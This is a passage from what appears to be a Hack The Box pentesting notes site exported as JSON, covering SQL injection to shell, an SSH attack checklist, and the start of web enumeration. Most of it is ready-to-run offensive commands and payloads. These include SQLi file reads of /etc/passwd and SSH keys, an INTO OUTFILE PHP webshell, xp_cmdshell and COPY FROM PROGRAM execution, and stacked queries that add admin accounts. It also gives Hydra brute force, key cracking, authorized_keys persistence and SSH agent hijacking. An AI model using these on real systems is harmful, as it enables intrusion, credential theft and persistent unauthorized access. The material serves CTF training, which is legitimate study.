URL-encode\nsqlmap ... --tamper=chardoubleencode       # Double URL-encode\nsqlmap ... --tamper=base64encode           # Base64\n\n# Combined\nsqlmap ... --tamper=space2comment,randomcase,charencode\n</code></pre>\n<hr>\n<h2 id=\"6-from-sqli-to-shell\">6 // From SQLi to shell</h2>\n<h3 id=\"file-read\">File read</h3>\n<pre><code class=\"language-bash\"># sqlmap\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch --file-read=/etc/passwd\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch --file-read=/home/&lt;user&gt;/.ssh/id_rsa\n\n# Manual (MySQL)\n' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4-- -\n' UNION SELECT LOAD_FILE('/var/www/html/.env'),2,3,4-- -\n</code></pre>\n<h3 id=\"file-write-webshell\">File write (webshell)</h3>\n<pre><code class=\"language-bash\"># sqlmap\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch \\\n  --file-write=./shell.php \\\n  --file-dest=/var/www/html/shell.php\n\n# Manual (MySQL)\n' UNION SELECT '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;',2,3,4 INTO OUTFILE '/var/www/html/shell.php'-- -\n</code></pre>\n<h3 id=\"direct-os-shell\">Direct OS shell</h3>\n<pre><code class=\"language-bash\"># sqlmap os-shell (attempts webshell upload or UDF)\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch --os-shell\n\n# MSSQL xp_cmdshell\n' ; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -\n' ; EXEC xp_cmdshell 'whoami';-- -\n\n# PostgreSQL COPY FROM PROGRAM\n' ; CREATE TABLE IF NOT EXISTS cmd(o TEXT); COPY cmd FROM PROGRAM 'id';-- -\n</code></pre>\n<h3 id=\"stacked-queries-second-order-command-chaining\">Stacked queries (second-order / command chaining)</h3>\n<pre><code class=\"language-sql\">-- Add admin user (INSERT)\n'; INSERT INTO users(username,password,role) VALUES('hacker','hacked','admin');-- -\n\n-- Change admin password (UPDATE)\n'; UPDATE users SET password='hacked' WHERE username='admin';-- -\n\n-- Enable xp_cmdshell on MSSQL\n'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -\n</code></pre>\n<blockquote>\n<p><strong>Stacked queries</strong><br>\nNot all DBMS/drivers support stacked queries. MySQL with PHP (mysqli/PDO) usually <strong>does not</strong> support them. MSSQL and PostgreSQL generally do.</p>\n</blockquote>\n<hr>\n<h2 id=\"7-bypass-common-filters\">7 // Bypass common filters</h2>\n<h3 id=\"blocked-spaces\">Blocked spaces</h3>\n<pre><code>/**/        → SELECT/**/username/**/FROM/**/users\n%09         → tab\n%0a         → newline\n+           → SELECT+username+FROM+users (in URL)\n</code></pre>\n<h3 id=\"blocked-keywords-select-union-etc\">Blocked keywords (SELECT, UNION, etc.)</h3>\n<pre><code># Case mixing\nSeLeCt, UnIoN, FrOm\n\n# Inline comment (MySQL)\nUN/**/ION SE/**/LECT\n\n# Double keyword (if the filter removes once)\nUNUNIONION SESELECTLECT\n\n# URL encoding\n%53ELECT → SELECT\n%55NION  → UNION\n</code></pre>\n<h3 id=\"blocked-quotes\">Blocked quotes</h3>\n<pre><code># Hex encoding (MySQL)\nSELECT * FROM users WHERE username=0x61646d696e     → 'admin'\n\n# CHAR()\nSELECT * FROM users WHERE username=CHAR(97,100,109,105,110)\n</code></pre>\n<h3 id=\"comments-to-terminate-the-query\">Comments to terminate the query</h3>\n<pre><code>-- -          → MySQL, MSSQL, PostgreSQL\n#             → MySQL\n/*            → all\n;%00          → null byte termination\n</code></pre>\n<hr>\n<h2 id=\"8-second-order-sql-injection\">8 // Second-order SQL Injection</h2>\n<blockquote>\n<p><strong>What is it</strong><br>\nMalicious input is <strong>saved</strong> in the database and the injection occurs when that data is <strong>reused</strong> in another query. Example: user registration with username <code>admin'-- -</code> → the password change query uses that username without sanitization.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Register a user with a payload in the username/name/email field</li>\n</ul>\n<pre><code>Username: admin'-- -\nEmail: test@test.com' OR '1'='1\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\">\n<p><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Perform actions that reuse that data (change password, profile, export)</p>\n</li>\n<li class=\"task-list-item\">\n<p><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Observe if behavior changes (access as admin, SQL errors)</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Clicker</td>\n<td>SQL injection in parameter <em>names</em> (mass-assignment): <code>%0a</code> newline bypasses the filter, lets you set <code>role=Admin</code> at signup</td>\n</tr>\n<tr>\n<td>Jarvis</td>\n<td>UNION-based SQLi in <code>room.php?cod=</code> — 5-column query, extracts <code>phpmyadmin</code> config + DB credentials</td>\n</tr>\n<tr>\n<td>Love</td>\n<td>Time-based blind SQLi on Voting System login — alternative path; SSRF reaches admin faster</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "SSH — Enumeration and Exploitation Checklist",
      "slug": "ssh-enumeration-and-exploitation-checklist",
      "date": "2026·03·03",
      "tags": [
        "htb",
        "ssh",
        "enumeration",
        "methodology",
        "enum"
      ],
      "desc": "Quick Order 1. Banner grab — SSH version and OS fingerprinting 2. Look for credentials in other services (web, DB, SNMP, NFS) — SSH and almost always a means, not the initial vector 3. Try credentials found on SSH (ssh user@target) 4. Look for private SSH keys (LFI, NFS share,…",
      "body": "<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. Banner grab — SSH version and OS fingerprinting\n2. Look for credentials in other services (web, DB, SNMP, NFS) — SSH and almost always a <strong>means</strong>, not the initial vector\n3. Try credentials found on SSH (<code>ssh user@target</code>)\n4. Look for private SSH keys (LFI, NFS share, backup, FTP)\n5. Brute force <strong>only</strong> with confirmed username and targeted wordlist\n6. Post-exploitation: read <code>sshd_config</code>, <code>known_hosts</code>, <code>ssh/config</code> for pivoting\n7. Tunneling to access internal non-exposed services\n8. Agent forwarding hijack if available</p>\n</blockquote>\n<hr>\n<h1 id=\"ssh-enumeration-exploitation-checklist\">SSH // Enumeration &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nSSH (Secure Shell) — port <strong>22/tcp</strong> (or non-standard ports).\nPresent on almost all HTB Linux machines. Rarely the initial entry vector, but fundamental for lateral movement, tunneling, and post-exploitation.</p>\n</blockquote>\n<hr>\n<h2 id=\"0-detection-version-enumeration\">0 // Detection &amp; Version Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap — identify SSH and version</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sC -sV -p 22 &lt;TARGET&gt;\nnmap -sV --script=ssh* -p 22 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Manual banner grabbing</li>\n</ul>\n<pre><code class=\"language-bash\">nc -nv &lt;TARGET&gt; 22\n# or\nncat &lt;TARGET&gt; 22\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SSH on non-standard ports (always check full port scan)</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sV -p- &lt;TARGET&gt; | grep ssh\n</code></pre>\n<blockquote>\n<p><strong>Version and OS</strong><br>\nThe SSH banner often reveals the target OS:\n- <code>OpenSSH 8.2p1 Ubuntu</code> → Ubuntu 20.04\n- <code>OpenSSH 8.9p1 Ubuntu</code> → Ubuntu 22.04\n- <code>OpenSSH 9.2p1 Debian</code> → Debian 12\n- <code>OpenSSH_for_Windows</code> → Windows with OpenSSH</p>\n</blockquote>\n<hr>\n<h2 id=\"1-authentication-enumeration\">1 // Authentication Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Accepted authentication methods</li>\n</ul>\n<pre><code class=\"language-bash\">ssh -v &lt;TARGET&gt; 2&gt;&amp;1 | grep &quot;Authentications that can continue&quot;\n# oppure\nnmap --script ssh-auth-methods -p 22 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Username enumeration (OpenSSH &lt; 7.7 — CVE-2018-15473)</li>\n</ul>\n<pre><code class=\"language-bash\"># Metasploit\nmsfconsole -q -x &quot;use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS &lt;TARGET&gt;; set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; run&quot;\n\n# Python script\nsearchsploit -m 45233\npython3 45233.py &lt;TARGET&gt; -u &lt;username&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Anonymous / passwordless access</li>\n</ul>\n<pre><code class=\"language-bash\">ssh root@&lt;TARGET&gt;\nssh guest@&lt;TARGET&gt;\nssh admin@&lt;TARGET&gt;\n\n## 2 // Brute Force\n\n&gt; **Warning**  \n&gt; Brute force SSH is slow by design (rate limiting, MaxAuthTries).\n&gt; Use it **only** when you have a confirmed username and a targeted wordlist.\n&gt; Always prefer credentials found in other services.\n\n- [ ] Hydra\n```bash\n# Single user\nhydra -l &lt;USER&gt; -P /usr/share/wordlists/rockyou.txt ssh://&lt;TARGET&gt;\n\n# User list\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://&lt;TARGET&gt;\n\n# With rate limiting\nhydra -l &lt;USER&gt; -P wordlist.txt ssh://&lt;TARGET&gt; -t 4 -W 3\n\n# Combo file login:password (flag -C)\nhydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://&lt;TARGET&gt;\n</code></pre>\n<blockquote>\n<p><strong>Flag <code>-C</code> — Combo file</strong><br>\nHydra accepts files in the format <code>login:password</code> (separated by <code>:</code>) with the <strong><code>-C</code></strong> flag.\nReplaces <code>-l</code> and <code>-P</code>. Useful for testing default credentials in one go.\nSecLists has several in <code>/usr/share/seclists/Passwords/Default-Credentials/</code>:\n- <code>ssh-betterdefaultpasslist.txt</code> — 136 common SSH combos (<code>root:password</code>, <code>admin:admin</code>, etc.)\n- <code>ftp-betterdefaultpasslist.txt</code> — FTP combos\n- <code>telnet-betterdefaultpasslist.txt</code> — Telnet combos\n- [ ] NetExec</p>\n</blockquote>\n<pre><code class=\"language-bash\">nxc ssh &lt;TARGET&gt; -u &lt;USER&gt; -p wordlist.txt\nnxc ssh &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Medusa</li>\n</ul>\n<pre><code class=\"language-bash\">medusa -h &lt;TARGET&gt; -u &lt;USER&gt; -P /usr/share/wordlists/rockyou.txt -M ssh\n</code></pre>\n<blockquote>\n<p><strong>Targeted wordlists</strong><br>\nBefore generic brute force, try:\n- Credentials found in other services (web apps, databases, SNMP)\n- Password spray with username=password (<code>admin:admin</code>)\n- CeWL to generate wordlists from the website: <code>cewl http://&lt;TARGET&gt; -w custom_wordlist.txt</code></p>\n</blockquote>\n<hr>\n<h2 id=\"3-ssh-keys\">3 // SSH Keys</h2>\n<h3 id=\"31-stolen-keys\">3.1 // Stolen Keys</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for private keys on exposed services</li>\n</ul>\n<pre><code class=\"language-bash\"># Common paths to search (LFI, NFS, FTP, web)\n/home/&lt;user&gt;/.ssh/id_rsa\n/home/&lt;user&gt;/.ssh/id_ed25519\n/home/&lt;user&gt;/.ssh/id_ecdsa\n/root/.ssh/id_rsa\n/etc/ssh/ssh_host_rsa_key      # host key (rare but possible)\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Use stolen key</li>\n</ul>\n<pre><code class=\"language-bash\"># Save and set permissions\nchmod 600 id_rsa\nssh -i id_rsa &lt;USER&gt;@&lt;TARGET&gt;\n\n# If the key has a passphrase // crack it\nssh2john id_rsa &gt; id_rsa.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash\n# or\nhashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt   # RSA/DSA OpenSSH\nhashcat -m 22931 id_rsa.hash /usr/share/wordlists/rockyou.txt   # ed25519\n</code></pre>\n<h3 id=\"32-authorized_keys-injection\">3.2 // authorized_keys injection</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> If you have write access to <code>~/.ssh/</code> of a user (NFS, FTP, web upload, DB write)</li>\n</ul>\n<pre><code class=\"language-bash\"># Generate key pair\nssh-keygen -f mykey -N &quot;&quot;\n\n# Write the public key\necho &quot;$(cat mykey.pub)&quot; &gt;&gt; /target/home/&lt;user&gt;/.ssh/authorized_keys\n\n# Set permissions (if possible)\nchmod 700 /target/home/&lt;user&gt;/.ssh\nchmod 600 /target/home/&lt;user&gt;/.ssh/authorized_keys\n\n# Connect\nssh -i mykey &lt;USER&gt;@&lt;TARGET&gt;\n</code></pre>\n<h3 id=\"33-weak-predictible-keys\">3.3 // Weak / Predictible Keys</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Debian Predictable PRNG (CVE-2008-0166)</li>\n</ul>\n<pre><code class=\"language-bash\"># Keys generated on Debian/Ubuntu 2006-2008 with broken OpenSSL\n# Weak keys database:\nls /usr/share/exploitdb/exploits/linux/remote/5720/\n# or\nsearchsploit openssl debian weak\n</code></pre>\n<hr>\n<h2 id=\"4-ssh-tunneling\">4 // SSH Tunneling</h2>\n<blockquote>\n<p><strong>When to use</strong><br>\nAccess to internal services not exposed, pivoting to other machines, bypass firewalls.</p>\n</blockquote>\n<h3 id=\"41-local-port-forward-accessing-internal-remote-services\">4.1 // Local Port Forward (accessing internal remote services)</h3>\n<pre><code class=\"language-bash\"># Remote port 3306 (MySQL) accessible only from localhost on the target\nssh -L 3306:127.0.0.1:3306 &lt;USER&gt;@&lt;TARGET&gt;\n# Now: mysql -h 127.0.0.1 -u root -p (on your machine)\n\n# Port to another machine in the internal network\nssh -L 8080:192.168.1.100:80 &lt;USER&gt;@&lt;TARGET&gt;\n# Now: curl http://127.0.0.1:8080\n</code></pre>\n<h3 id=\"42-remote-port-forward-exposing-local-services-on-the-target\">4.2 // Remote Port Forward (exposing local services on the target)</h3>\n<pre><code class=\"language-bash\"># Expose your listener on port 4444 of the target\nssh -R 4444:127.0.0.1:4444 &lt;USER&gt;@&lt;TARGET&gt;\n\n# Expose a local web server to the target\nssh -R 8888:127.0.0.1:80 &lt;USER&gt;@&lt;TARGET&gt;\n</code></pre>\n<h3 id=\"43-dynamic-port-forward-socks-proxy\">4.3 // Dynamic Port Forward (SOCKS proxy)</h3>\n<pre><code class=\"language-bash\"># SOCKS proxy to access the entire internal network\nssh -D 1080 &lt;USER&gt;@&lt;TARGET&gt;\n\n# Configure proxychains\necho &quot;socks5 127.0.0.1 1080&quot; &gt;&gt; /etc/proxychains4.conf\n\n# Use any tool through the tunnel\nproxychains4 nmap -sT -Pn 192.168.1.0/24\nproxychains4 curl http://192.168.1.100\n</code></pre>\n<h3 id=\"44-useful-options\">4.4 // Useful Options</h3>\n<pre><code class=\"language-bash\"># Background tunnel (do not open shell)\nssh -f -N -L 3306:127.0.0.1:3306 &lt;USER&gt;@&lt;TARGET&gt;\n\n# Tunnel + interactive shell\nssh -L 3306:127.0.0.1:3306 &lt;USER&gt;@&lt;TARGET&gt; -t bash\n\n# Bypass host key check (lab/CTF only!)\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null &lt;USER&gt;@&lt;TARGET&gt;\n\n## 5 // SSH Agent Forwarding Abuse\n\n&gt; **Scenario**  \n&gt; If a user connects to the target with `ssh -A` (agent forwarding active), their agent socket is accessible on the machine. If you have access as that user or root, you can use their keys without having them on the disk.\n\n- [ ] Look for active agent sockets\n```bash\n# As root or current user\nfind /tmp -name &quot;agent.*&quot; -type s 2&gt;/dev/null\nls -la /tmp/ssh-*/\n\n# Environment variable\nenv | grep SSH_AUTH_SOCK\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Agent hijacking</li>\n</ul>\n<pre><code class=\"language-bash\"># Set the variable to the found socket\nexport SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.&lt;PID&gt;\n\n# Check available keys\nssh-add -l\n\n# Use the keys to connect to other machines\nssh &lt;user&gt;@&lt;NEXT_TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"6-post-exploitation-via-ssh\">6 // Post-Exploitation via SSH</h2>\n<h3 id=\"61-configuration-files\">6.1 // Configuration Files</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SSH Server Configuration</li>\n</ul>\n<pre><code class=\"language-bash\">cat /etc/ssh/sshd_config\n# Look for:\n# PermitRootLogin yes           → direct root login\n# PasswordAuthentication yes     → brute force possible\n# AllowUsers / DenyUsers         → authorized users\n# AuthorizedKeysFile              → key path (might be non-standard)\n# ForceCommand                    → forced commands (restricted shell)\n# PermitTunnel yes                → tunneling enabled\n# AllowAgentForwarding yes        → agent forwarding enabled\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SSH Client Configuration</li>\n</ul>\n<pre><code class=\"language-bash\">cat ~/.ssh/config\n# Can reveal: internal hosts, users, keys, proxy jump\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Authorized Keys</li>\n</ul>\n<pre><code class=\"language-bash\">cat ~/.ssh/authorized_keys\n# Can reveal: connecting users, comments with hostname/email\n# command=&quot;&quot; → key with forced command (restricted)\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Known hosts</li>\n</ul>\n<pre><code class=\"language-bash\">cat ~/.ssh/known_hosts\n# Reveals hosts the user has connected to (targets for pivoting)\n# If hashed: ssh-keygen -F &lt;host&gt; to search\n</code></pre>\n<h3 id=\"62-persistence\">6.2 // Persistence</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Add your own SSH key</li>\n</ul>\n<pre><code class=\"language-bash\"># As compromised user\nmkdir -p ~/.ssh\necho '&lt;SSH_PUBKEY&gt;' &gt;&gt; ~/.ssh/authorized_keys\nchmod 700 ~/.ssh\nchmod 600 ~/.ssh/authorized_keys\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Add key to root (if you have root access)</li>\n</ul>\n<pre><code class=\"language-bash\">mkdir -p /root/.ssh\necho '&lt;SSH_PUBKEY&gt;' &gt;&gt; /root/.ssh/authorized_keys\nchmod 700 /root/.ssh\nchmod 600 /root/.ssh/authorized_keys\n</code></pre>\n<hr>\n<h2 id=\"7-escape-from-restricted-shell-forcecommand\">7 // Escape from Restricted Shell / ForceCommand</h2>\n<blockquote>\n<p><strong>Scenario</strong><br>\nSome SSH keys have <code>command=\"...\"</code> in authorized_keys, or sshd_config has <code>ForceCommand</code>.\nThe user can connect but is limited to specific commands.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Identify the restriction</li>\n</ul>\n<pre><code class=\"language-bash\"># Try to run commands\nssh &lt;USER&gt;@&lt;TARGET&gt; id\nssh &lt;USER&gt;@&lt;TARGET&gt; bash\nssh &lt;USER&gt;@&lt;TARGET&gt; /bin/sh\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Bypass with <code>-t</code> (force TTY)</li>\n</ul>\n<pre><code class=\"language-bash\">ssh &lt;USER&gt;@&lt;TARGET&gt; -t bash\nssh &lt;USER&gt;@&lt;TARGET&gt; -t /bin/sh\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Bypass via SCP/SFTP (if the forced command doesn't block them)</li>\n</ul>\n<pre><code class=\"language-bash\"># SCP might work even with ForceCommand\nscp &lt;USER&gt;@&lt;TARGET&gt;:/etc/passwd .\n\n# SFTP\nsftp &lt;USER&gt;@&lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Bypass via port forwarding (even with restricted shell)</li>\n</ul>\n<pre><code class=\"language-bash\"># Tunneling might work even without a shell\nssh -N -L 3306:127.0.0.1:3306 &lt;USER&gt;@&lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"8-proxyjump-pivoting-multi-hop\">8 // ProxyJump / Pivoting multi-hop</h2>\n<pre><code class=\"language-bash\"># Jump through a bastion host\nssh -J &lt;USER1&gt;@&lt;BASTION&gt; &lt;USER2&gt;@&lt;INTERNAL_HOST&gt;\n\n# Multi-hop\nssh -J &lt;USER1&gt;@&lt;HOP1&gt;,&lt;USER2&gt;@&lt;HOP2&gt; &lt;USER3&gt;@&lt;FINAL_TARGET&gt;\n\n# Equivalent with ProxyCommand (for older versions)\nssh -o ProxyCommand=&quot;ssh -W %h:%p &lt;USER1&gt;@&lt;BASTION&gt;&quot; &lt;USER2&gt;@&lt;INTERNAL_HOST&gt;\n</code></pre>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>BoardLight</td>\n<td>SSH as <code>larissa</code> reusing the Dolibarr DB password — classic password-reuse anti-pattern</td>\n</tr>\n<tr>\n<td>Broker</td>\n<td>SSH used for stable shell after the ActiveMQ deserialisation RCE drops a one-liner</td>\n</tr>\n<tr>\n<td>Clicker</td>\n<td>SSH as the user after the SQLi-driven credential chain completes</td>\n</tr>\n<tr>\n<td>Codify</td>\n<td>SSH as <code>joshua</code> after the bcrypt hash from <code>tickets.db</code> cracks to <code>spongebob1</code></td>\n</tr>\n<tr>\n<td>Devvortex</td>\n<td>SSH as <code>logan</code> after the MySQL hash extracted from the Joomla DB is cracked</td>\n</tr>\n<tr>\n<td>Editorial</td>\n<td>SSH as <code>dev</code> once the SSRF exposes the internal Flask API and the private key is recoverable</td>\n</tr>\n<tr>\n<td>Jarvis</td>\n<td>SSH as <code>pepper</code> reached through the chained SQLi → phpMyAdmin LFI → webshell flow</td>\n</tr>\n<tr>\n<td>Poison</td>\n<td>SSH on FreeBSD using the password reused from the listfiles.php content</td>\n</tr>\n<tr>\n<td>SolidState</td>\n<td>SSH as <code>mindy</code> using credentials found inside a James-managed mailbox</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "Web Services — Enumeration and Exploitation Checklist",
      "slug": "web-services-enumeration-and-exploitation-checklist",
      "date": "2026·02·18",
      "tags": [
        "htb",
        "web",
        "enumeration",
        "methodology",
        "enum"
      ],
      "desc": "Quick Order 1. whatweb + manual inspection (source, footer, header) 2. VHost/Subdomain enumeration with ffuf 3. Directory bruteforce with feroxbuster or dirsearch 4. CMS/version identification → search for CVE 5. Default credentials on login panel 6. Parameter fuzzing on found…",
      "body": "<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. <code>whatweb</code> + manual inspection (source, footer, header)\n2. VHost/Subdomain enumeration with ffuf\n3. Directory bruteforce with feroxbuster or dirsearch\n4. CMS/version identification → search for CVE\n5. Default credentials on login panel\n6. Parameter fuzzing on found endpoints\n7. LFI/SQLi tests on parameters\n8. File upload bypass (if upload form present)\n9. Nuclei for automatic vulnerability scan</p>\n</blockquote>\n<hr>\n<h1 id=\"web-services-enumeration-exploitation-checklist\">Web Services // Enumeration &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nChecklist for enumerating and attacking web services on HTB/CTF machines.\nAvailable tools: ffuf, feroxbuster, dirsearch, gobuster, nikto, whatweb, wpscan, sqlmap, burpsuite</p>\n</blockquote>\n<hr>\n<h2 id=\"0-initial-reconnaissance\">0 // Initial Reconnaissance</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Identify web servers and technologies</li>\n</ul>\n<pre><code class=\"language-bash\">whatweb http://&lt;TARGET&gt;\ncurl -I http://&lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check SSL certificate (if HTTPS) for hostname/vhost</li>\n</ul>\n<pre><code class=\"language-bash\">openssl s_client -connect &lt;TARGET&gt;:443 2&gt;/dev/null | openssl x509 -noout -text | grep -i &quot;subject\\|dns&quot;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Inspect HTML source for comments, paths, FQDN</li>\n</ul>\n<pre><code class=\"language-bash\">curl -s http://&lt;TARGET&gt; | grep -iE &quot;&lt;!--|href=|src=|action=|\\.htb|\\.local&quot;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check <code>robots.txt</code>, <code>sitemap.xml</code>, <code>.well-known/</code></li>\n</ul>\n<pre><code class=\"language-bash\">curl -s http://&lt;TARGET&gt;/robots.txt\ncurl -s http://&lt;TARGET&gt;/sitemap.xml\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Footer / header for hostname and version leaks (as in BoardLight)</li>\n</ul>\n<hr>\n<h2 id=\"1-vhost-subdomain-enumeration\">1 // VHost / Subdomain Enumeration</h2>\n<blockquote>\n<p><strong>Always do this</strong><br>\nEven if the site appears static, there may be hidden vhosts (e.g., <code>crm.board.htb</code> in BoardLight).</p>\n</blockquote>\n<h3 id=\"ffuf-vhost-fuzzing\">ffuf // VHost fuzzing</h3>\n<pre><code class=\"language-bash\">ffuf -H &quot;Host: FUZZ.&lt;DOMAIN&gt;&quot; \\\n     -H &quot;User-Agent: PENTEST&quot; \\\n     -c \\\n     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n     -u http://&lt;DOMAIN&gt;/ \\\n     -fs &lt;DEFAULT_SIZE&gt;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-fs &lt;size&gt;</code></td>\n<td>Filters by response size (excludes default page)</td>\n</tr>\n<tr>\n<td><code>-fc 301,302</code></td>\n<td>Filters by status code</td>\n</tr>\n<tr>\n<td><code>-fw &lt;words&gt;</code></td>\n<td>Filters by word count</td>\n</tr>\n<tr>\n<td><code>-fl &lt;lines&gt;</code></td>\n<td>Filters by line count</td>\n</tr>\n<tr>\n<td><code>-mc 200,403</code></td>\n<td>Shows only specific status codes</td>\n</tr>\n<tr>\n<td><code>-t 50</code></td>\n<td>Threads (default 40)</td>\n</tr>\n<tr>\n<td><code>-o results.json -of json</code></td>\n<td>Saves output</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p><strong>Find the right filter</strong><br>\nFirst run WITHOUT filters to see the default response, then filter with <code>-fs</code>, <code>-fw</code> or <code>-fl</code>.</p>\n</blockquote>\n<h3 id=\"ffuf-subdomain-dns\">ffuf // Subdomain DNS</h3>\n<pre><code class=\"language-bash\">ffuf -u http://&lt;TARGET&gt;/ \\\n     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n     -H &quot;Host: 